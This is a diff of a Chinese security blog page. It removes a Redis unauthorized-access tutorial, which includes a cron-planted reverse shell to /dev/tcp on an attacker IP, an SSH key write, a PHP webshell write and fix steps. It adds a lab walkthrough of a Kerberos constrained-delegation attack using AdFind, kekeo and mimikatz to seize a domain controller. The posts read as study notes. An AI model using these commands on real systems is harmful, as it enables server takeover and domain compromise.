@@ -6,7 +6,7 @@
 
 <title>test | cherry cheeks</title>
 
-<link rel="shortcut icon" href="https://cherry-cheeks.github.io/favicon.ico?v=1635050903314">
+<link rel="shortcut icon" href="https://cherry-cheeks.github.io/favicon.ico?v=1637230058308">
 
 <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cherry-cheeks.github.io/styles/main.css">
@@ -23,6 +23,18 @@
 <!-- DEMO JS -->
 <!--<script src="media/scripts/index.js"></script>-->
 
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-210911370-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+
+        gtag('js', new Date());
+        gtag('config', 'UA-210911370-1');
+    </script>
 
 
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
@@ -67,17 +79,9 @@
                     
                 </div>
             
-                <div class="nav-item">
-                    
-                        <a href="/post/about" class="menu gt-a-link">
-                            关于
-                        </a>
-                    
-                </div>
-            
         </div>
         <div style="text-align: center">
-            <form id="gridea-search-form" style="position: relative" data-update="1635050903314" action="/search/index.html">
+            <form id="gridea-search-form" style="position: relative" data-update="1637230058308" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                 <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
             </form>
@@ -93,111 +97,69 @@
                 </h2>
                 <div class="post-info">
                     <time class="post-time gt-c-content-color-first">
-                        · 2021-10-24 ·
+                        · 2021-11-18 ·
                     </time>
+                    
+                        <a href="https://cherry-cheeks.github.io/tag/dEPWRNcdo/" class="post-tags">
+                            # 内网
+                        </a>
                     
                 </div>
                 <div class="post-content">
-                    <p>一、说明<br>
-二、搭建redis（以下均为命令）<br>
-三、利用条件<br>
-三、redis未授权利用<br>
-、脚本利用<br>
-五、修复方案：</p>
-<p>一、说明<br>
-redis是一款开源数据库，redis因配置不当可造成未授权访问，从而造成信息泄露，如果redis以root身份运行，可以给root账户写入ssh公钥文件，从而直接通过ssh免密登录受害者服务器</p>
-<p>二、搭建redis（linux）<br>
-1、wget http://download.redis.io/releases/redis-2.8.17.tar.gz(centos需要安装gcc ： yum install -y gcc)<br>
-2、tar xzf redis-2.8.17.tar.gz<br>
-3、cd redis-2.8.17<br>
-4、make<br>
-5、cd src<br>
-6、cp redis-server /usr/bin<br>
-7、cp redis-cli /usr/bin<br>
-8、cd ../<br>
-9、cp redis.conf /etc<br>
-10、cat /etc/redis.conf</p>
-<p>over</p>
-<p>三、利用条件<br>
-允许远程登录<br>
-保护模式关闭<br>
-没有设置密码<br>
-防火墙关闭</p>
-<p>三、redis未授权利用<br>
-1、redis反弹shell（攻击机118.31.172.220，受害机108.61.162.2）<br>
-首先要在攻击机上监听8855端口：nc -lvnp 8855<br>
-然后再在攻击机上输入如下命令：<br>
-A、redis-cli -h 108.61.162.2<br>
-B、set xx &quot;\n * * * * bash -i &gt;&amp; /dev/tcp/118.31.172.220/8855 0&gt;&amp;1\n&quot;<br>
-C、config set dir /var/spool/cron<br>
-D、config set dbfilename root<br>
-E、save</p>
-<p>emmm，命令没问题，但是没有反弹成功</p>
-<p>2、redis写入公钥（攻击机118.31.172.220，受害机108.61.162.2）<br>
-首先攻击机输入命令：ssh-key -t rsa，然后一直回车（在本地生成公钥，在/root/.ssh目录下面）<br>
-然后查看公钥命令：cat /root/.ssh/id_rsa.pub</p>
-<p>记住，这里公钥后面要用到</p>
-<p>接下来在攻击机中进入受害机redis-cli：redis-cli -h 108.61.162.2<br>
-执行命令： config set dir /root/.ssh<br>
-config set dbfilename authorized_keys<br>
-set x &quot;\n\n\n公钥\n\n\n&quot;（这里公钥的两边各有3个\n）<br>
-save<br>
-ok后，直接用命令“ssh -i id_rsa root@108.61.162.2”免密登录受害机</p>
-<p>3、redis写入webshell（攻击机108.61.162.2，受害机118.31.172.220）<br>
-条件：服务器开着web服务，可以拥有写入权限，并且redis权限较低<br>
-攻击机执行命令：<br>
-redis-cli -h 118.31.172.220<br>
-config set dir /var/www/html/<br>
-config set dbfilename webshell.php<br>
-set x &quot;\n\n\n<?php phpinfo();?>\n\n\n&quot;<br>
-save</p>
-<p>over</p>
-<p>、脚本利用<br>
-https://github.com/n0b0dyCN/redis-rogue-server<br>
-https://github.com/r35tart/RedisWriteFile（推荐）</p>
-<p>五、修复方案：<br>
-开启保护模式<br>
-限制ip登录（在redis.conf中，将bind 127.0.0.1前面的#去掉）<br>
-添加密码（在redis.conf中，搜索requirepass，后面跟密码：requirepass admin，密码admin，然后登录就redis-cli -a admin）<br>
-修改端口号在redis.conf中，port 8800 端口设置为8800或者redis-server --port 8800）</p>
-<p>注：限制ip登录个人感觉更直接更管用</p>
+                    <!-- more -->
+<p>准备环境：<br>
+1、windows server 2012 r2	ip：192.168.179.213	域管：administrator	机器名：dc（域控）<br>
+2、windows 7专业版	ip：192.168.179.130	用户名：win7	机器名：win7(域成员机)<br>
+3、域用户weipai	密码：2000816Liu!<br>
+4、域：zhou.com</p>
+<p>准备工作：<br>
+1、因为委派对象只能是机器账户和服务账户，所以我们要将域用户weipai，通过spn注册成服务账户<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229608890.png" alt="" loading="lazy"><br>
+2、将服务账户weipai设置成约束委派<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229635574.png" alt="" loading="lazy"></p>
+<p>工具：<br>
+kekeo、mimikatz、AdFind</p>
+<p>复现过程：<br>
+一、我们得先用AdFind找到设置了约束委派的用户：<br>
+AdFind.exe -b &quot;DC=zhou,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229670555.png" alt="" loading="lazy"><br>
+得到信息：<br>
+1、设置约束委派的服务账户有weipai这一个<br>
+2、只能访问指定模拟域用户访问dc（域控）机器上面的cifs服务<br>
+正好我们有weipai这个服务账户的密码，我们可以通过约束委派攻击拿下域控</p>
+<p>二、通过keKeo这个工具向KDC发起请求，得道weipai这个服务账户的TGT<br>
+tgt::ask /user:weipai /password:2000816Liu! /domain:zhou.com /ticket:weipai.kirbi<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229716951.png" alt="" loading="lazy"></p>
+<p>三、利用weipai这个服务账户的TGT申请域控cifs服务的TGS票据<br>
+tgs::s4u /tgt:TGT_weipai@ZHOU.COM_krbtgt~zhou.com@ZHOU.COM.kirbi /user:administrator@zhou.com /service:cifs/dc.zhou.com<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229753468.png" alt="" loading="lazy"></p>
+<p>四、用mimikatz导入TGS票据<br>
+<img src="https://cherry-cheeks.github.io/post-images/1637229781166.png" alt="" loading="lazy"></p>
+<p>总结：<br>
+1、找到域内存在约束委派的用户，并查看是否可以访问域控的服务<br>
+2、拿下存在非约束委派的用户，并用kekeo来制作TGT<br>
+3、用kekeo配合上一步制作的TGT来制作访问域控的TGS<br>
+4、mimikatz导入上一步制作的TGS，拿下域控</p>
+<p>参考：https://www.freebuf.com/articles/system/198381.html<br>
+https://xz.aliyun.com/t/10061#toc-6</p>
+<!-- more -->
 
                 </div>
             </article>
         </div>
 
         
-
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://cherry-cheeks.github.io/post/1/" class="post-title gt-a-link">
+                    约束委派攻击-基于服务用户复现
+                </a>
+            </div>
         
 
         
 
         
-            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
-
-<style>
-	div#vcomments{
-		width:100%;
-		max-width: 1000px;
-		padding: 2.5%
-	}
-</style>
-
-
-	<div id="vcomments"></div>
-
-<script>
-	new Valine({
-		el: '#vcomments',
-		appId: '',
-		appKey: '',
-		avatar: '',
-		pageSize: 5,
-		recordIp: false,
-		placeholder: 'Just Go Go',
-		visitor: false,
-	});
-</script>
 
         
 
@@ -219,7 +181,7 @@ https://github.com/r35tart/RedisWriteFile（推荐）</p>
         
     </div>
     <div class="footer-info">
-        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+        Contact Me <a href="#" target="_blank">QQ：</a>
     </div>
     <div>
         Theme by <a href="https://imhanjie.com/" target="_blank">imhanjie</a>, Powered by <a
